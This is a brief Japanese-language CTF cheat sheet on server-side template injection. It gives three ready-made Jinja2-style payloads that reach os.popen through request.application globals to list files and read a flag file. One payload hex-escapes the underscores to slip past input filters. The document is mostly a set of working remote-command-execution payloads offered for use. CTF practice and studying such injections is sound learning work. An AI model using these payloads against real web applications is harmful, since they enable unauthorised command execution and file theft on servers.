# CTFチートシート

## SSTI:
問題にどこにファイルがあるかわからない時には
```Python:SSTI_ls
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```
SSTIができる時には、
```Python:SSTI_payload1
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flags').read()}}
```

```Python:SSTI_payload2
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```
この場合はFlagの名前が、*flag*だとする
